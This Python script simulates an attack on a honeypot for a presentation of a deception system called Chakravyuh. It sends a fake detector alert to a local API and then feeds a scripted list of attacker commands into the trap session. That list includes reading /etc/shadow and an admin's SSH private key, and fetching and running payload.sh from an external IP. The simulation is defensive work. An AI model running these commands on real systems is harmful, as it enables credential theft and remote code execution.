"""
Simulates the complete end-to-end Chakravyuh data flow for a presentation.

**Role:** Acts as both the initial trigger (ML detector) and the trapped attacker.

**Flow:**
1.  Sends an initial "anomaly detected" alert to the main API server.
2.  The API server receives the alert and deploys a trap container, returning a session ID.
3.  This script then uses the session ID to send a series of fake attacker commands
    to the API, simulating an attacker interacting with the honeypot.
4.  The API, via the TrapController, logs these commands, gets responses from an LLM,
    extracts TTPs, and streams telemetry to Kafka.
5.  The API's Kafka consumer picks up the telemetry and broadcasts it to the dashboard.
6.  Finally, the script ends the session, triggering the teardown and reporting process.

**Prerequisites:**
  - Run the main API server first: `uvicorn backend.api.main:app --reload --port 8000`
  - Ensure Kafka and Ollama are running.

**Run:**
    python backend/simulate_attack.py
"""
import asyncio
import json
import requests
import time
from datetime import datetime, timezone

API_URL = "http://localhost:8000/api/v1"

# This represents the initial alert from the ML detector
INITIAL_ALERT = {
    "flow_id": "185.220.101.47-10.0.5.12",
    "anomaly_score": 0.91,
    "threshold": 0.85,
    "severity": "critical",
    "attacker_ip": "185.220.101.47",
    "timestamp": datetime.now(timezone.utc).isoformat()
}

# These are the commands the "attacker" will run inside the honeypot
ATTACKER_COMMANDS = [
    "whoami",
    "uname -a",
    "ps aux",
    "cat /etc/passwd",
    "cat /etc/shadow",
    "ls -la /home/his_admin/",
    "cat /home/his_admin/.ssh/id_rsa",
    "wget http://185.220.101.47/payload.sh -O /tmp/p.sh",
    "chmod +x /tmp/p.sh",
    "/tmp/p.sh"
]

def main():
    """Runs the full simulation."""
    session_id = None
    try:
        # 1. Trigger the initial alert
        print("STEP 1: ML Detector sends alert to API...")
        resp = requests.post(f"{API_URL}/alert", json=INITIAL_ALERT, timeout=10)
        resp.raise_for_status()
        data = resp.json()
        session_id = data.get("session_id")
        if not session_id:
            raise ValueError("API did not return a session_id")
        print(f"  ✅  SUCCESS: Trap session created. Session ID: {session_id}\n")
        time.sleep(2)

        # 2. Simulate attacker commands
        print("STEP 2: Attacker begins interacting with the honeypot...")
        for i, command in enumerate(ATTACKER_COMMANDS):
            print(f"  > Sending command {i+1}/{len(ATTACKER_COMMANDS)}: '{command}'")
            cmd_payload = {"command": command}
            resp = requests.post(f"{API_URL}/session/{session_id}/command", json=cmd_payload, timeout=20)
            resp.raise_for_status()
            print("    - Command logged by API.")
            time.sleep(random.uniform(2, 5)) # Realistic delay between commands
        print("  ✅  SUCCESS: All attacker commands sent.\n")
        time.sleep(2)

    except requests.exceptions.RequestException as e:
        print(f"\n❌ ERROR: Could not connect to the API at {API_URL}.")
        print("   Please ensure the FastAPI server is running: uvicorn backend.api.main:app --reload --port 8000")
        print(f"   Details: {e}")
    except Exception as e:
        print(f"\n❌ An unexpected error occurred: {e}")
    finally:
        # 3. End the session
        if session_id:
            print("STEP 3: Attacker logs out, ending the session...")
            try:
                resp = requests.post(f"{API_URL}/session/{session_id}/end", timeout=10)
                resp.raise_for_status()
                print("  ✅  SUCCESS: Session terminated and report generated.")
            except requests.exceptions.RequestException as e:
                print(f"  ❌ ERROR: Failed to end session {session_id}. Details: {e}")

    print("\nSimulation complete. Check the dashboard for live updates.")

if __name__ == "__main__":
    import random
    main()